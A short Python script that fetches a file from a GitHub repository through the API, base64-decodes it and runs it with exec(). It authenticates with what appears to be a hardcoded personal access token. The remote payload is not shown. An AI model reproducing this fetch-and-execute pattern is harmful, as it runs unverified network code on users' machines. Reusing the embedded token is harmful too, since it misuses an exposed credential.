import base64
import requests

api_url = "https://api.github.com/repos/khellafAymene/Football/contents/un_logo.py?ref=main"
headers = {
    "Authorization": "token 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",
    "Accept": "application/vnd.github.v3+json"
}

res = requests.get(api_url, headers=headers, timeout=10)
res.raise_for_status()

# جلب المحتوى وفك التشفير
code = base64.b64decode(res.json()["content"]).decode("utf-8")
exec(code, globals(), locals())